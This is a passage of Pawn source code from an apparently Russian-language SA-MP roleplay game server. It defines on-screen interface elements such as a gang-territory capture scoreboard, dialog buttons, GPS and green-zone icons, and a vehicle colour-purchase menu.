	TextDrawBoxColor(sto_td_global[25], -1);
	TextDrawSetShadow(sto_td_global[25], 0);
	TextDrawSetOutline(sto_td_global[25], 0);
	TextDrawBackgroundColor(sto_td_global[25], 51);
	TextDrawFont(sto_td_global[25], 2);
	TextDrawSetProportional(sto_td_global[25], 1);
	TextDrawSetSelectable(sto_td_global[25], true);

	capture_td[0] = TextDrawCreate(22.699951, 284.500000, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[0], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[0], 140.000000, 42.409931);
	TextDrawAlignment(capture_td[0], 1);
	TextDrawColor(capture_td[0], -1282407681);
	TextDrawSetShadow(capture_td[0], 0);
	TextDrawSetOutline(capture_td[0], 0);
	TextDrawBackgroundColor(capture_td[0], 255);
	TextDrawFont(capture_td[0], 4);
	TextDrawSetProportional(capture_td[0], 0);
	TextDrawSetShadow(capture_td[0], 0);

	capture_td[1] = TextDrawCreate(23.799957, 285.549957, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[1], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[1], 138.000000, 40.730045);
	TextDrawAlignment(capture_td[1], 1);
	TextDrawColor(capture_td[1], 386400767);
	TextDrawSetShadow(capture_td[1], 0);
	TextDrawSetOutline(capture_td[1], 0);
	TextDrawBackgroundColor(capture_td[1], 255);
	TextDrawFont(capture_td[1], 4);
	TextDrawSetProportional(capture_td[1], 0);
	TextDrawSetShadow(capture_td[1], 0);

	capture_td[2] = TextDrawCreate(26.299949, 287.737457, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[2], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[2], 89.000000, 17.000000);
	TextDrawAlignment(capture_td[2], 1);
	TextDrawColor(capture_td[2], -1282407681);
	TextDrawSetShadow(capture_td[2], 0);
	TextDrawSetOutline(capture_td[2], 0);
	TextDrawBackgroundColor(capture_td[2], 255);
	TextDrawFont(capture_td[2], 4);
	TextDrawSetProportional(capture_td[2], 0);
	TextDrawSetShadow(capture_td[2], 0);

	capture_td[3] = TextDrawCreate(26.199951, 307.112518, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[3], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[3], 91.000000, 17.000000);
	TextDrawAlignment(capture_td[3], 1);
	TextDrawColor(capture_td[3], -1282407681);
	TextDrawSetShadow(capture_td[3], 0);
	TextDrawSetOutline(capture_td[3], 0);
	TextDrawBackgroundColor(capture_td[3], 255);
	TextDrawFont(capture_td[3], 4);
	TextDrawSetProportional(capture_td[3], 0);
	TextDrawSetShadow(capture_td[3], 0);

	capture_td[4] = TextDrawCreate(27.299972, 285.549957, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[4], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[4], 92.000000, 40.000000);
	TextDrawAlignment(capture_td[4], 1);
	TextDrawColor(capture_td[4], 386400767);
	TextDrawSetShadow(capture_td[4], 0);
	TextDrawSetOutline(capture_td[4], 0);
	TextDrawBackgroundColor(capture_td[4], 255);
	TextDrawFont(capture_td[4], 4);
	TextDrawSetProportional(capture_td[4], 0);
	TextDrawSetShadow(capture_td[4], 0);

	capture_td[5] = TextDrawCreate(71.700073, 291.974975, "итальянская_мафич");
	TextDrawLetterSize(capture_td[5], 0.162994, 1.004999);
	TextDrawAlignment(capture_td[5], 2);
	TextDrawColor(capture_td[5], -1);
	TextDrawSetShadow(capture_td[5], 0);
	TextDrawSetOutline(capture_td[5], 0);
	TextDrawBackgroundColor(capture_td[5], 255);
	TextDrawFont(capture_td[5], 2);
	TextDrawSetProportional(capture_td[5], 1);
	TextDrawSetShadow(capture_td[5], 0);

	capture_td[6] = TextDrawCreate(71.600074, 310.076080, "русская_мафия");
	TextDrawLetterSize(capture_td[6], 0.162994, 1.004999);
	TextDrawAlignment(capture_td[6], 2);
	TextDrawColor(capture_td[6], -1);
	TextDrawSetShadow(capture_td[6], 0);
	TextDrawSetOutline(capture_td[6], 0);
	TextDrawBackgroundColor(capture_td[6], 255);
	TextDrawFont(capture_td[6], 2);
	TextDrawSetProportional(capture_td[6], 1);
	TextDrawSetShadow(capture_td[6], 0);

	capture_td[7] = TextDrawCreate(21.699920, 275.574981, "время:_00:40");
	TextDrawLetterSize(capture_td[7], 0.176496, 0.913124);
	TextDrawAlignment(capture_td[7], 1);
	TextDrawColor(capture_td[7], -1);
	TextDrawSetShadow(capture_td[7], 0);
	TextDrawSetOutline(capture_td[7], 0);
	TextDrawBackgroundColor(capture_td[7], 255);
	TextDrawFont(capture_td[7], 2);
	TextDrawSetProportional(capture_td[7], 1);
	TextDrawSetShadow(capture_td[7], 0);

	capture_td[8] = TextDrawCreate(116.199951, 288.662567, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[8], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[8], 42.219795, 15.000000);
	TextDrawAlignment(capture_td[8], 1);
	TextDrawColor(capture_td[8], -1282407681);
	TextDrawSetShadow(capture_td[8], 0);
	TextDrawSetOutline(capture_td[8], 0);
	TextDrawBackgroundColor(capture_td[8], 255);
	TextDrawFont(capture_td[8], 4);
	TextDrawSetProportional(capture_td[8], 0);
	TextDrawSetShadow(capture_td[8], 0);

	capture_td[9] = TextDrawCreate(116.099945, 308.025207, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[9], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[9], 42.219795, 15.000000);
	TextDrawAlignment(capture_td[9], 1);
	TextDrawColor(capture_td[9], -1282407681);
	TextDrawSetShadow(capture_td[9], 0);
	TextDrawSetOutline(capture_td[9], 0);
	TextDrawBackgroundColor(capture_td[9], 255);
	TextDrawFont(capture_td[9], 4);
	TextDrawSetProportional(capture_td[9], 0);
	TextDrawSetShadow(capture_td[9], 0);

	capture_td[10] = TextDrawCreate(117.399963, 289.412292, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[10], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[10], 39.649890, 13.440010);
	TextDrawAlignment(capture_td[10], 1);
	TextDrawColor(capture_td[10], 386400767);
	TextDrawSetShadow(capture_td[10], 0);
	TextDrawSetOutline(capture_td[10], 0);
	TextDrawBackgroundColor(capture_td[10], 255);
	TextDrawFont(capture_td[10], 4);
	TextDrawSetProportional(capture_td[10], 0);
	TextDrawSetShadow(capture_td[10], 0);

	capture_td[11] = TextDrawCreate(117.399963, 309.013488, "LD_SPAC:white");
	TextDrawLetterSize(capture_td[11], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[11], 39.649890, 13.310007);
	TextDrawAlignment(capture_td[11], 1);
	TextDrawColor(capture_td[11], 386400767);
	TextDrawSetShadow(capture_td[11], 0);
	TextDrawSetOutline(capture_td[11], 0);
	TextDrawBackgroundColor(capture_td[11], 255);
	TextDrawFont(capture_td[11], 4);
	TextDrawSetProportional(capture_td[11], 0);
	TextDrawSetShadow(capture_td[11], 0);

	capture_td[12] = TextDrawCreate(137.799896, 290.012481, "10");
	TextDrawLetterSize(capture_td[12], 0.260998, 1.206248);
	TextDrawAlignment(capture_td[12], 2);
	TextDrawColor(capture_td[12], -1);
	TextDrawSetShadow(capture_td[12], 0);
	TextDrawSetOutline(capture_td[12], 0);
	TextDrawBackgroundColor(capture_td[12], 255);
	TextDrawFont(capture_td[12], 2);
	TextDrawSetProportional(capture_td[12], 1);
	TextDrawSetShadow(capture_td[12], 0);

	capture_td[13] = TextDrawCreate(137.799896, 309.413665, "12");
	TextDrawLetterSize(capture_td[13], 0.260998, 1.206248);
	TextDrawAlignment(capture_td[13], 2);
	TextDrawColor(capture_td[13], -1);
	TextDrawSetShadow(capture_td[13], 0);
	TextDrawSetOutline(capture_td[13], 0);
	TextDrawBackgroundColor(capture_td[13], 255);
	TextDrawFont(capture_td[13], 2);
	TextDrawSetProportional(capture_td[13], 1);
	TextDrawSetShadow(capture_td[13], 0);

	capture_td[14] = TextDrawCreate(42.000000, 289.312500, "LD_POOL:BALL");
	TextDrawLetterSize(capture_td[14], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[14], 2.659996, 2.279999);
	TextDrawAlignment(capture_td[14], 1);
	TextDrawColor(capture_td[14], -1282407681);
	TextDrawSetShadow(capture_td[14], 0);
	TextDrawSetOutline(capture_td[14], 0);
	TextDrawBackgroundColor(capture_td[14], 255);
	TextDrawFont(capture_td[14], 4);
	TextDrawSetProportional(capture_td[14], 0);
	TextDrawSetShadow(capture_td[14], 0);

	capture_td[15] = TextDrawCreate(30.000000, 319.937500, "LD_POOL:BALL");
	TextDrawLetterSize(capture_td[15], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[15], 2.659996, 2.279999);
	TextDrawAlignment(capture_td[15], 1);
	TextDrawColor(capture_td[15], -1282407681);
	TextDrawSetShadow(capture_td[15], 0);
	TextDrawSetOutline(capture_td[15], 0);
	TextDrawBackgroundColor(capture_td[15], 255);
	TextDrawFont(capture_td[15], 4);
	TextDrawSetProportional(capture_td[15], 0);
	TextDrawSetShadow(capture_td[15], 0);

	capture_td[16] = TextDrawCreate(91.500000, 302.350128, "LD_POOL:BALL");
	TextDrawLetterSize(capture_td[16], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[16], 2.659996, 2.279999);
	TextDrawAlignment(capture_td[16], 1);
	TextDrawColor(capture_td[16], -1282407681);
	TextDrawSetShadow(capture_td[16], 0);
	TextDrawSetOutline(capture_td[16], 0);
	TextDrawBackgroundColor(capture_td[16], 255);
	TextDrawFont(capture_td[16], 4);
	TextDrawSetProportional(capture_td[16], 0);
	TextDrawSetShadow(capture_td[16], 0);

	capture_td[17] = TextDrawCreate(65.500000, 307.162628, "LD_POOL:BALL");
	TextDrawLetterSize(capture_td[17], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[17], 1.969995, 1.619999);
	TextDrawAlignment(capture_td[17], 1);
	TextDrawColor(capture_td[17], -1282407681);
	TextDrawSetShadow(capture_td[17], 0);
	TextDrawSetOutline(capture_td[17], 0);
	TextDrawBackgroundColor(capture_td[17], 255);
	TextDrawFont(capture_td[17], 4);
	TextDrawSetProportional(capture_td[17], 0);
	TextDrawSetShadow(capture_td[17], 0);

	capture_td[18] = TextDrawCreate(105.000000, 318.100128, "LD_POOL:BALL");
	TextDrawLetterSize(capture_td[18], -0.000999, 0.000000);
	TextDrawTextSize(capture_td[18], 1.969995, 1.619999);
	TextDrawAlignment(capture_td[18], 1);
	TextDrawColor(capture_td[18], -1282407681);
	TextDrawSetShadow(capture_td[18], 0);
	TextDrawSetOutline(capture_td[18], 0);
	TextDrawBackgroundColor(capture_td[18], 255);
	TextDrawFont(capture_td[18], 4);
	TextDrawSetProportional(capture_td[18], 0);
	TextDrawSetShadow(capture_td[18], 0);
}

stock LoadTextDraws()
{
	//паспорт
	/*pass_TD[0] = TextDrawCreate(243.3999, 75.8533, "document:passport");
	TextDrawTextSize(pass_TD[0], 177.0000, 266.0000);
	TextDrawAlignment(pass_TD[0], 1);
	TextDrawColor(pass_TD[0], -1);
	TextDrawBackgroundColor(pass_TD[0], 255);
	TextDrawFont(pass_TD[0], 4);
	TextDrawSetProportional(pass_TD[0], 0);
	TextDrawSetShadow(pass_TD[0], 0);*/

	server_green_zone[0] = TextDrawCreate(32.666671, 314.429504, "cromulent:greenzone");
	TextDrawLetterSize(server_green_zone[0], 0.000000, 0.000000);
	TextDrawTextSize(server_green_zone[0], 75.666587, 16.177783);
	TextDrawAlignment(server_green_zone[0], 1);
	TextDrawColor(server_green_zone[0], -1);
	TextDrawSetShadow(server_green_zone[0], 0);
	TextDrawSetOutline(server_green_zone[0], 0);
	TextDrawFont(server_green_zone[0], 4);

    KolvDialog[0] = TextDrawCreate(442.884368, 198.916671, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[0], 59.000000, 15.000000);
	TextDrawTextSize(KolvDialog[0], 60.000000, 16.916656);
	TextDrawAlignment(KolvDialog[0], 1);
	TextDrawColor(KolvDialog[0], 865730559);
	TextDrawSetShadow(KolvDialog[0], 0);
	TextDrawSetOutline(KolvDialog[0], 0);
	TextDrawFont(KolvDialog[0], 4);
	TextDrawSetSelectable(KolvDialog[0], true);

	KolvDialog[1] = TextDrawCreate(442.884002, 217.000045, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[1], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[1], 60.000000, 16.916645);
	TextDrawAlignment(KolvDialog[1], 1);
	TextDrawColor(KolvDialog[1], 865730559);
	TextDrawSetShadow(KolvDialog[1], 0);
	TextDrawSetOutline(KolvDialog[1], 0);
	TextDrawFont(KolvDialog[1], 4);
	TextDrawSetSelectable(KolvDialog[1], true);

	KolvDialog[2] = TextDrawCreate(442.884246, 235.083297, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[2], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[2], 60.000000, 16.916656);
	TextDrawAlignment(KolvDialog[2], 1);
	TextDrawColor(KolvDialog[2], 865730559);
	TextDrawSetShadow(KolvDialog[2], 0);
	TextDrawSetOutline(KolvDialog[2], 0);
	TextDrawFont(KolvDialog[2], 4);
	TextDrawSetSelectable(KolvDialog[2], true);

	KolvDialog[3] = TextDrawCreate(442.884216, 253.166687, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[3], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[3], 60.000000, 16.916671);
	TextDrawAlignment(KolvDialog[3], 1);
	TextDrawColor(KolvDialog[3], 865730559);
	TextDrawSetShadow(KolvDialog[3], 0);
	TextDrawSetOutline(KolvDialog[3], 0);
	TextDrawFont(KolvDialog[3], 4);
	TextDrawSetSelectable(KolvDialog[3], true);

	KolvDialog[4] = TextDrawCreate(442.883972, 271.250000, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[4], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[4], 60.000000, 16.916690);
	TextDrawAlignment(KolvDialog[4], 1);
	TextDrawColor(KolvDialog[4], 865730559);
	TextDrawSetShadow(KolvDialog[4], 0);
	TextDrawSetOutline(KolvDialog[4], 0);
	TextDrawFont(KolvDialog[4], 4);
	TextDrawSetSelectable(KolvDialog[4], true);

	KolvDialog[5] = TextDrawCreate(442.884185, 289.333282, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[5], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[5], 60.000000, 16.916687);
	TextDrawAlignment(KolvDialog[5], 1);
	TextDrawColor(KolvDialog[5], 865730559);
	TextDrawSetShadow(KolvDialog[5], 0);
	TextDrawSetOutline(KolvDialog[5], 0);
	TextDrawFont(KolvDialog[5], 4);
	TextDrawSetSelectable(KolvDialog[5], true);

	KolvDialog[6] = TextDrawCreate(526.280578, 198.916687, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[6], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[6], 60.000000, 16.916646);
	TextDrawAlignment(KolvDialog[6], 1);
	TextDrawColor(KolvDialog[6], 865730559);
	TextDrawSetShadow(KolvDialog[6], 0);
	TextDrawSetOutline(KolvDialog[6], 0);
	TextDrawFont(KolvDialog[6], 4);
	TextDrawSetSelectable(KolvDialog[6], true);

	KolvDialog[7] = TextDrawCreate(526.281494, 216.999954, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[7], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[7], 60.000000, 16.916687);
	TextDrawAlignment(KolvDialog[7], 1);
	TextDrawColor(KolvDialog[7], 865730559);
	TextDrawSetShadow(KolvDialog[7], 0);
	TextDrawSetOutline(KolvDialog[7], 0);
	TextDrawFont(KolvDialog[7], 4);
	TextDrawSetSelectable(KolvDialog[7], true);

	KolvDialog[8] = TextDrawCreate(526.281250, 235.083328, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[8], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[8], 60.000000, 16.916671);
	TextDrawAlignment(KolvDialog[8], 1);
	TextDrawColor(KolvDialog[8], 865730559);
	TextDrawSetShadow(KolvDialog[8], 0);
	TextDrawSetOutline(KolvDialog[8], 0);
	TextDrawFont(KolvDialog[8], 4);
	TextDrawSetSelectable(KolvDialog[8], true);

	KolvDialog[9] = TextDrawCreate(526.281372, 253.166687, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[9], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[9], 60.000000, 16.916687);
	TextDrawAlignment(KolvDialog[9], 1);
	TextDrawColor(KolvDialog[9], 865730559);
	TextDrawSetShadow(KolvDialog[9], 0);
	TextDrawSetOutline(KolvDialog[9], 0);
	TextDrawFont(KolvDialog[9], 4);
	TextDrawSetSelectable(KolvDialog[9], true);

	KolvDialog[10] = TextDrawCreate(526.281250, 271.250061, "LD_SPAC:white");
	TextDrawLetterSize(KolvDialog[10], 0.000000, 0.000000);
	TextDrawTextSize(KolvDialog[10], 60.000000, 16.916666);
	TextDrawAlignment(KolvDialog[10], 1);
	TextDrawColor(KolvDialog[10], 865730559);
	TextDrawSetShadow(KolvDialog[10], 0);
	TextDrawSetOutline(KolvDialog[10], 0);
	TextDrawFont(KolvDialog[10], 4);
	TextDrawSetSelectable(KolvDialog[10], true);

 	gps_td = TextDrawCreate(32.333332, 297.837097, "cromulent:gpson_td");
	TextDrawLetterSize(gps_td, 0.000000, 0.000000);
	TextDrawTextSize(gps_td, 28.666658, 14.933323);
	TextDrawAlignment(gps_td, 1);
	TextDrawColor(gps_td, -1);
	TextDrawSetShadow(gps_td, 0);
	TextDrawSetOutline(gps_td, 0);
	TextDrawFont(gps_td, 4);

	//

    AnimDraw = TextDrawCreate(405.500000, 420.000000, "~y~~k~~PED_SPRINT~ ~g~to stop animation");
	TextDrawLetterSize(AnimDraw, 0.333499, 1.337500);
	TextDrawAlignment(AnimDraw, 1);
	TextDrawColor(AnimDraw, -1);
	TextDrawSetShadow(AnimDraw, 0);
	TextDrawSetOutline(AnimDraw, 1);
	TextDrawBackgroundColor(AnimDraw, 51);
	TextDrawFont(AnimDraw, 2);
	TextDrawSetProportional(AnimDraw, 1);
	//
	//Новый текстдрав от  RP
	JRPTD[0] = TextDrawCreate(635.000000, 162.862960, "usebox");
	TextDrawLetterSize(JRPTD[0], 0.000000, 24.341768);
	TextDrawTextSize(JRPTD[0], 516.000000, 0.000000);
	TextDrawAlignment(JRPTD[0], 1);
	TextDrawColor(JRPTD[0], -2139062017);
	TextDrawUseBox(JRPTD[0], true);
	TextDrawBoxColor(JRPTD[0], -1381126742);
	TextDrawSetShadow(JRPTD[0], 0);
	TextDrawSetOutline(JRPTD[0], 0);
	TextDrawBackgroundColor(JRPTD[0], -1);
	TextDrawFont(JRPTD[0], 0);

	JRPTD[1] = TextDrawCreate(525.666625, 162.192596, "LD_SPAC:white");
	TextDrawLetterSize(JRPTD[1], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[1], 99.666687, 17.007400);
	TextDrawAlignment(JRPTD[1], 1);
	TextDrawColor(JRPTD[1], -2139062017);
	TextDrawSetShadow(JRPTD[1], 0);
	TextDrawSetOutline(JRPTD[1], 0);
	TextDrawFont(JRPTD[1], 4);

	JRPTD[2] = TextDrawCreate(525.666625, 178.370376, "LD_SPAC:white");
	TextDrawLetterSize(JRPTD[2], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[2], 99.666687, 0.829620);
	TextDrawAlignment(JRPTD[2], 1);
	TextDrawColor(JRPTD[2], -1);
	TextDrawSetShadow(JRPTD[2], 0);
	TextDrawSetOutline(JRPTD[2], 0);
	TextDrawFont(JRPTD[2], 4);

	JRPTD[3] = TextDrawCreate(530.999633, 166.340759, "ЊOKYЊKA A‹¦OMO—…‡•");
	TextDrawLetterSize(JRPTD[3], 0.192331, 0.749629);
	TextDrawAlignment(JRPTD[3], 1);
	TextDrawColor(JRPTD[3], -1);
	TextDrawSetShadow(JRPTD[3], 0);
	TextDrawSetOutline(JRPTD[3], 0);
	TextDrawBackgroundColor(JRPTD[3], 51);
	TextDrawFont(JRPTD[3], 2);
	TextDrawSetProportional(JRPTD[3], 1);

	JRPTD[4] = TextDrawCreate(523.333312, 210.726013, "LD_SPAC:white");
	TextDrawLetterSize(JRPTD[4], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[4], 104.333374, 13.274078);
	TextDrawAlignment(JRPTD[4], 1);
	TextDrawColor(JRPTD[4], -2139062017);
	TextDrawSetShadow(JRPTD[4], 0);
	TextDrawSetOutline(JRPTD[4], 0);
	TextDrawFont(JRPTD[4], 4);

	JRPTD[5] = TextDrawCreate(540.666381, 236.199874, "LD_SPAC:white"); // основной цвет
	TextDrawLetterSize(JRPTD[5], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[5], 68.999984, 12.859263);
	TextDrawAlignment(JRPTD[5], 1);
	TextDrawColor(JRPTD[5], -2139062017);
	TextDrawSetShadow(JRPTD[5], 0);
	TextDrawSetOutline(JRPTD[5], 0);
	TextDrawFont(JRPTD[5], 4);
	TextDrawSetSelectable(JRPTD[5], true);

	JRPTD[6] = TextDrawCreate(540.666381, 252.547836, "LD_SPAC:white"); // цвет салона
	TextDrawLetterSize(JRPTD[6], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[6], 68.999984, 12.859263);
	TextDrawAlignment(JRPTD[6], 1);
	TextDrawColor(JRPTD[6], -2139062017);
	TextDrawSetShadow(JRPTD[6], 0);
	TextDrawSetOutline(JRPTD[6], 0);
	TextDrawFont(JRPTD[6], 4);
	TextDrawSetSelectable(JRPTD[6], true);

	JRPTD[7] = TextDrawCreate(520.999816, 278.340484, "LD_SPAC:white"); // приобрести
	TextDrawLetterSize(JRPTD[7], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[7], 51.333374, 15.762939);
	TextDrawAlignment(JRPTD[7], 1);
	TextDrawColor(JRPTD[7], -2139062017);
	TextDrawSetShadow(JRPTD[7], 0);
	TextDrawSetOutline(JRPTD[7], 0);
	TextDrawFont(JRPTD[7], 4);
	TextDrawSetSelectable(JRPTD[7], true);

	JRPTD[8] = TextDrawCreate(578.666442, 278.096252, "LD_SPAC:white"); // отмена
	TextDrawLetterSize(JRPTD[8], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[8], 51.333374, 15.762939);
	TextDrawAlignment(JRPTD[8], 1);
	TextDrawColor(JRPTD[8], -2139062017);
	TextDrawSetShadow(JRPTD[8], 0);
	TextDrawSetOutline(JRPTD[8], 0);
	TextDrawFont(JRPTD[8], 4);
	TextDrawSetSelectable(JRPTD[8], true);

	JRPTD[9] = TextDrawCreate(520.999938, 293.274047, "LD_SPAC:white");
	TextDrawLetterSize(JRPTD[9], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[9], 51.333374, 0.829648);
	TextDrawAlignment(JRPTD[9], 1);
	TextDrawColor(JRPTD[9], 1470774271);
	TextDrawSetShadow(JRPTD[9], 0);
	TextDrawSetOutline(JRPTD[9], 0);
	TextDrawFont(JRPTD[9], 4);

	JRPTD[10] = TextDrawCreate(578.666870, 293.029602, "LD_SPAC:white");
	TextDrawLetterSize(JRPTD[10], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[10], 51.333374, 0.829648);
	TextDrawAlignment(JRPTD[10], 1);
	TextDrawColor(JRPTD[10], -297791233);
	TextDrawSetShadow(JRPTD[10], 0);
	TextDrawSetOutline(JRPTD[10], 0);
	TextDrawFont(JRPTD[10], 4);

	JRPTD[11] = TextDrawCreate(525.333190, 281.244323, "ЊP…O—PEC¦…");
	TextDrawLetterSize(JRPTD[11], 0.160999, 0.915556);
	TextDrawAlignment(JRPTD[11], 1);
	TextDrawColor(JRPTD[11], -1);
	TextDrawSetShadow(JRPTD[11], 0);
	TextDrawSetOutline(JRPTD[11], 0);
	TextDrawBackgroundColor(JRPTD[11], 51);
	TextDrawFont(JRPTD[11], 2);
	TextDrawSetProportional(JRPTD[11], 1);

	JRPTD[12] = TextDrawCreate(590.999450, 280.999816, "O¦ME®A");
	TextDrawLetterSize(JRPTD[12], 0.160999, 0.915556);
	TextDrawAlignment(JRPTD[12], 1);
	TextDrawColor(JRPTD[12], -1);
	TextDrawSetShadow(JRPTD[12], 0);
	TextDrawSetOutline(JRPTD[12], 0);
	TextDrawBackgroundColor(JRPTD[12], 51);
	TextDrawFont(JRPTD[12], 2);
	TextDrawSetProportional(JRPTD[12], 1);

	JRPTD[13] = TextDrawCreate(542.000061, 238.103836, "‹‘—PA¦’ OC®O‹®O† ‰‹E¦");
	TextDrawLetterSize(JRPTD[13], 0.125999, 0.849183);
	TextDrawAlignment(JRPTD[13], 1);
	TextDrawColor(JRPTD[13], -1);
	TextDrawSetShadow(JRPTD[13], 0);
	TextDrawSetOutline(JRPTD[13], 0);
	TextDrawBackgroundColor(JRPTD[13], 51);
	TextDrawFont(JRPTD[13], 2);
	TextDrawSetProportional(JRPTD[13], 1);

	JRPTD[14] = TextDrawCreate(544.999938, 254.451904, "‹‘—PA¦’ ‰‹E¦ CA‡O®A");
	TextDrawLetterSize(JRPTD[14], 0.125999, 0.849183);
	TextDrawAlignment(JRPTD[14], 1);
	TextDrawColor(JRPTD[14], -1);
	TextDrawSetShadow(JRPTD[14], 0);
	TextDrawSetOutline(JRPTD[14], 0);
	TextDrawBackgroundColor(JRPTD[14], 51);
	TextDrawFont(JRPTD[14], 2);
	TextDrawSetProportional(JRPTD[14], 1);

	JRPTD[15] = TextDrawCreate(540.666625, 248.474105, "LD_SPAC:white");
	TextDrawLetterSize(JRPTD[15], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[15], 69.000061, 0.829620);
	TextDrawAlignment(JRPTD[15], 1);
	TextDrawColor(JRPTD[15], -1);
	TextDrawSetShadow(JRPTD[15], 0);
	TextDrawSetOutline(JRPTD[15], 0);
	TextDrawFont(JRPTD[15], 4);

	JRPTD[16] = TextDrawCreate(540.666687, 264.407470, "LD_SPAC:white");
	TextDrawLetterSize(JRPTD[16], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[16], 69.000061, 0.829620);
	TextDrawAlignment(JRPTD[16], 1);
	TextDrawColor(JRPTD[16], -1);
	TextDrawSetShadow(JRPTD[16], 0);
	TextDrawSetOutline(JRPTD[16], 0);
	TextDrawFont(JRPTD[16], 4);

	JRPTD[17] = TextDrawCreate(524.333129, 211.555694, "ld_beat:left"); // лево
	TextDrawLetterSize(JRPTD[17], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[17], 9.333332, 12.029634);
	TextDrawAlignment(JRPTD[17], 1);
	TextDrawColor(JRPTD[17], -1);
	TextDrawSetShadow(JRPTD[17], 0);
	TextDrawSetOutline(JRPTD[17], 0);
	TextDrawFont(JRPTD[17], 4);
	TextDrawSetSelectable(JRPTD[17], true);

	JRPTD[18] = TextDrawCreate(617.332885, 211.311233, "ld_beat:right"); // право
	TextDrawLetterSize(JRPTD[18], 0.000000, 0.000000);
	TextDrawTextSize(JRPTD[18], 9.333332, 12.029634);
	TextDrawAlignment(JRPTD[18], 1);
	TextDrawColor(JRPTD[18], -1);
	TextDrawSetShadow(JRPTD[18], 0);
	TextDrawSetOutline(JRPTD[18], 0);
	TextDrawFont(JRPTD[18], 4);
	TextDrawSetSelectable(JRPTD[18], true);
	//
	Button[0] = TextDrawCreate(225.000000, 429.625000, "LD_BEAT:left");
	TextDrawLetterSize(Button[0], 0.000000, 0.000000);
	TextDrawTextSize(Button[0], 19.500000, 17.937500);
	TextDrawAlignment(Button[0], 1);
	TextDrawColor(Button[0], -1);
	TextDrawSetShadow(Button[0], 0);
	TextDrawSetOutline(Button[0], 0);
	TextDrawFont(Button[0], 4);
	TextDrawSetSelectable(Button[0], 1);

	Button[1] = TextDrawCreate(393.500000, 429.187500, "LD_BEAT:right");
	TextDrawLetterSize(Button[1], 0.000000, 0.000000);
	TextDrawTextSize(Button[1], 19.000000, 18.375000);
	TextDrawAlignment(Button[1], 1);
	TextDrawColor(Button[1], -1);
	TextDrawSetShadow(Button[1], 0);
	TextDrawSetOutline(Button[1], 0);
	TextDrawFont(Button[1], 4);
	TextDrawSetSelectable(Button[1], 1);

	Button[2] = TextDrawCreate(319.000000, 430.500000, "LD_SPAC:white");
	TextDrawLetterSize(Button[2], 0.000000, 0.000000);
	TextDrawTextSize(Button[2], 73.500000, 15.750000);
	TextDrawAlignment(Button[2], 1);
	TextDrawColor(Button[2], -16776961);
	TextDrawSetShadow(Button[2], 0);
	TextDrawSetOutline(Button[2], 0);
	TextDrawFont(Button[2], 4);
	TextDrawSetSelectable(Button[2], 1);

	Button[3] = TextDrawCreate(245.500000, 430.500000, "LD_SPAC:white");
	TextDrawLetterSize(Button[3], 0.000000, 0.000000);
	TextDrawTextSize(Button[3], 73.500000, 15.750000);
	TextDrawAlignment(Button[3], 1);
	TextDrawColor(Button[3], 8388863);
	TextDrawSetShadow(Button[3], 0);
	TextDrawSetOutline(Button[3], 0);
	TextDrawFont(Button[3], 4);
	TextDrawSetSelectable(Button[3], 1);

	Button[4] = TextDrawCreate(255.500000, 432.250000, "ДАЛЕЕ");
	TextDrawLetterSize(Button[4], 0.349999, 1.026875);
	TextDrawAlignment(Button[4], 1);
	TextDrawColor(Button[4], -1);
	TextDrawSetShadow(Button[4], 0);
	TextDrawSetOutline(Button[4], 0);
	TextDrawBackgroundColor(Button[4], 51);
	TextDrawFont(Button[4], 2);
	TextDrawSetProportional(Button[4], 1);

	Button[5] = TextDrawCreate(329.000000, 432.250000, "ВЫХОД");
	TextDrawLetterSize(Button[5], 0.380499, 1.035625);
	TextDrawAlignment(Button[5], 1);
	TextDrawColor(Button[5], -1);
	TextDrawSetShadow(Button[5], 0);
	TextDrawSetOutline(Button[5], 0);
	TextDrawBackgroundColor(Button[5], 51);
